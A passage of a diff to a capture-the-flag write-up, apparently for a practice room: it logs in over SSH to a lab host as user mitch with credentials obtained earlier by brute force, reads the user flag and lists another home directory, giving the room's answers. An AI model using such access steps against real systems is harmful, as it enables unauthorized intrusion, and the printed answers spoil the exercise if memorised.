@@ -214,3 +214,57 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 08:01:
 
 ```
 
+Then login to ssh:
+
+```
+┌──(kali㉿kali)-[~/ken/CVE-2019-9053]
+└─$ ssh mitch@10.10.134.118 -p 2222
+The authenticity of host '[10.10.134.118]:2222 ([10.10.134.118]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.134.118]:2222' (ED25519) to the list of known hosts.
+mitch@10.10.134.118's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ 
+
+```
+
+What's the user flag?
+- G00d j0b, keep up!
+
+```
+
+Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
+$ whoami
+mitch
+$ ls
+user.txt
+$ cat user.txt
+G00d j0b, keep up!
+$ 
+
+```
+
+Is there any other user in the home directory? What's its name?
+- sunbath
+
+```
+$ pwd
+/home/mitch
+$ cd ..
+$ ls
+mitch  sunbath
+$ 
+
+```
+
